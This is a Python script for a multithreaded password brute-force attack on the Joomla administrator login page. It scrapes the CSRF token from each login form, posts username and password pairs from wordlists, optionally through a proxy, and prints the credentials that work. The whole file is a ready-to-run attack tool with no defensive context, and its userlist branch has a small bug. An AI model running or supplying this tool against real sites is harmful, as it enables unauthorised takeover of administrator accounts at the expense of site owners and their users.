#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from rich import print
from rich.progress import track
import sys
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

def get_data(path):
    return list(map(lambda x: x.strip(), open(path).readlines()))

print_lock = Lock()

def try_password(args):
    password, current_username, admin_url, proxy_dict, cookies, option, task, ret, verbose = args
    headers = { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/10.0"}

    r = requests.get(admin_url, proxies=proxy_dict, cookies=cookies, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    longstring = (soup.find_all('input', type='hidden')[-1]).get('name')

    data = {
        'username': current_username,
        'passwd': password,
        'option': option,
        'task': task,
        'return': ret,
        longstring: 1
    }
    
    r = requests.post(admin_url, data=data, proxies=proxy_dict, cookies=cookies, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    response = soup.find('div', {'class': 'alert-message'})        

    if response:
        if verbose:
            with print_lock:
                print(f"[red]Failed: {current_username}:{password}[/red]")
        return False
    else:
        with print_lock:
            print(f"\n[green]Success! {current_username}:{password}[/green]")
        return True

def try_login(current_username, admin_url, proxy_dict, cookies, option, task, ret, verbose, wordlist, threads):
    print(f"[blue]Starting bruteforce for username: {current_username}[/blue]")
    passwords = get_data(wordlist)
    total_passwords = len(passwords)
    print(f"[blue]Loaded {total_passwords} passwords from wordlist[/blue]")

    args_list = [(password, current_username, admin_url, proxy_dict, cookies, option, task, ret, verbose) 
                 for password in passwords]
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        results = list(executor.map(try_password, args_list))
        
    return True in results

def joomla_brute(url: str, wordlist: str, username: str = None, userlist: str = None, proxy: str = None, verbose: bool = False, threads: int = 8):
    """
    Perform Joomla login bruteforce attack
    
    Args:
        url (str): Joomla site URL (base URL, e.g., http://example.com)
        wordlist (str): Path to wordlist file
        username (str, optional): Single username to try
        userlist (str, optional): Path to username list file
        proxy (str, optional): Proxy URL (e.g. http://127.0.0.1:8080)
        verbose (bool, optional): Show verbose output
        threads (int, optional): Number of threads to use for bruteforce (default: 8)
    """
    if not username and not userlist:
        raise ValueError("Either username or userlist must be provided")
    if username and userlist:
        raise ValueError("Cannot use both username and userlist")

    proxy_dict = None
    if proxy:
        parsed_proxy_url = urlparse(proxy)
        proxy_dict = {parsed_proxy_url[0]: parsed_proxy_url[1]}

    # Initial setup
    admin_url = f"{url}/administrator/"
    ret = 'aW5kZXgucGhw'
    option = 'com_login'
    task = 'login'
    
    print(f"[blue]Connecting to {admin_url}[/blue]")
    cookies = requests.session().get(admin_url).cookies.get_dict()
    print("[green]Successfully connected to target[/green]")

    if userlist:
        users = get_data(userlist)
        for user in users:
            if try_login(user.decode('utf-8'), admin_url, proxy_dict, cookies, option, task, ret, verbose, wordlist, threads):
                break
    else:
        try_login(username, admin_url, proxy_dict, cookies, option, task, ret, verbose, wordlist, threads)